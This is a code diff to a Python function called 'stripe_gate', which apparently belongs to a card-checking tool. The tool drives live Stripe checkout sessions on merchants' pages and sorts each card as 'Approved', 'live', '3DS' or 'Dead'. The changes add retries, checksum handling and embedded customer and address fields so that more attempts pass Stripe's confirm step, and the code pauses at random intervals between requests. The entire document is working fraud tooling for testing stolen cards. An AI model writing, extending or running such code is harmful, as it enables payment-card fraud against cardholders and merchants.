@@ -698,6 +698,7 @@ async def stripe_gate(
         _session_mode = "payment"  # payment / subscription / setup
         _needs_email = False
         _update_ok = None  # None = not attempted, True/False = result
+        _any_details_needed = False
         for attempt in range(max_retries + 1):
             try:
                 r1 = await client.post(
@@ -890,10 +891,13 @@ async def stripe_gate(
             update_data = {
                 "eid": "NA",
                 "key": pk_live,
+                "browser_locale": browser_locale,
+                "redirect_type": "url",
             }
-            # Email
-            if _needs_email:
-                update_data["email"] = email
+            if init_checksum:
+                update_data["init_checksum"] = init_checksum
+            # Always include email — Stripe sessions expect it even if merchant pre-set it
+            update_data["email"] = email
             # Phone
             if _needs_phone:
                 update_data["phone_number"] = phone
@@ -932,9 +936,11 @@ async def stripe_gate(
                     headers=update_headers,
                 )
                 _update_ok = r_upd.status_code in (200, 201)
+                if _update_ok:
+                    _upd_json = r_upd.json()
+                    init_checksum = _upd_json.get("init_checksum", init_checksum)
             except Exception:
                 _update_ok = False
-            # Silently continue regardless — the confirm might still work
 
         await asyncio.sleep(random.uniform(0.4, 0.9))
 
@@ -960,11 +966,33 @@ async def stripe_gate(
             "expected_payment_method_type": "card",
             "key": pk_live,
             "js_checksum": js_checksum,
+            "browser_locale": browser_locale,
+            "redirect_type": "url",
         }
         if init_checksum:
             confirm_data["init_checksum"] = init_checksum
         if _needs_tos:
             confirm_data["consent[terms_of_service]"] = "accepted"
+
+        # Fallback: if /update failed, embed customer details directly in /confirm
+        if _update_ok is False or (_any_details_needed and _update_ok is None):
+            confirm_data["email"] = email
+            if _needs_phone:
+                confirm_data["phone_number"] = phone
+            if _needs_billing_addr:
+                confirm_data["billing_address[name]"] = f"{fname} {lname}"
+                confirm_data["billing_address[line1]"] = addr["street"]
+                confirm_data["billing_address[city]"] = addr["city"]
+                confirm_data["billing_address[state]"] = addr["state"]
+                confirm_data["billing_address[postal_code]"] = addr["zip"]
+                confirm_data["billing_address[country]"] = addr.get("country", "US")
+            if _needs_shipping:
+                confirm_data["shipping_address[name]"] = f"{fname} {lname}"
+                confirm_data["shipping_address[address][line1]"] = addr["street"]
+                confirm_data["shipping_address[address][city]"] = addr["city"]
+                confirm_data["shipping_address[address][state]"] = addr["state"]
+                confirm_data["shipping_address[address][postal_code]"] = addr["zip"]
+                confirm_data["shipping_address[address][country]"] = addr.get("country", "US")
 
         try:
             r3 = await client.post(
@@ -995,9 +1023,53 @@ async def stripe_gate(
             code = err.get("code", "")
             msg = err.get("message", "")
 
-            # Detect Stripe session integrity / confirm errors (only the specific message)
+            # Detect Stripe session integrity / confirm errors — retry with embedded details
             if "error has occurred confirming" in msg.lower():
-                # Enhanced diagnostics for session_error
+                if _any_details_needed and "email" not in confirm_data:
+                    confirm_data["email"] = email
+                    if _needs_phone:
+                        confirm_data["phone_number"] = phone
+                    if _needs_billing_addr:
+                        confirm_data["billing_address[name]"] = f"{fname} {lname}"
+                        confirm_data["billing_address[line1]"] = addr["street"]
+                        confirm_data["billing_address[city]"] = addr["city"]
+                        confirm_data["billing_address[state]"] = addr["state"]
+                        confirm_data["billing_address[postal_code]"] = addr["zip"]
+                        confirm_data["billing_address[country]"] = addr.get("country", "US")
+                    if _needs_shipping:
+                        confirm_data["shipping_address[name]"] = f"{fname} {lname}"
+                        confirm_data["shipping_address[address][line1]"] = addr["street"]
+                        confirm_data["shipping_address[address][city]"] = addr["city"]
+                        confirm_data["shipping_address[address][state]"] = addr["state"]
+                        confirm_data["shipping_address[address][postal_code]"] = addr["zip"]
+                        confirm_data["shipping_address[address][country]"] = addr.get("country", "US")
+                    try:
+                        await asyncio.sleep(random.uniform(0.5, 1.2))
+                        r3 = await client.post(
+                            f"https://api.stripe.com/v1/payment_pages/{cs_live}/confirm",
+                            data=confirm_data,
+                            headers=checkout_headers,
+                        )
+                        j3 = r3.json()
+                        r3_text = r3.text
+                        surl = j3.get("success_url", surl)
+                        if j3.get("status") == "succeeded":
+                            return "Approved! ✅ -» charged!", "Payment Successful", extra(decline_code="charged", stripe_msg="Payment Successful")
+                        retry_err = (j3.get("error") or {})
+                        if retry_err.get("decline_code") or retry_err.get("code"):
+                            rdcode = retry_err.get("decline_code", "")
+                            rcode = retry_err.get("code", "")
+                            rmsg = retry_err.get("message", "")
+                            rclean, rstype = _classify_decline(rdcode, rcode, rmsg)
+                            rdc_label = rdcode or rcode or ""
+                            if rstype == "live":
+                                return "Approved! ✅ -» live", rclean, extra(decline_code=rdc_label, stripe_msg=rmsg)
+                            elif rstype == "3ds":
+                                return "3DS 🔐", rclean, extra(decline_code=rdc_label, stripe_msg=rmsg)
+                            return "Dead! ❌", rclean, extra(decline_code=rdc_label, stripe_msg=rmsg)
+                    except Exception:
+                        pass
+
                 diag_parts = [f"mode={_session_mode}"]
                 if _needs_email:
                     diag_parts.append("email")
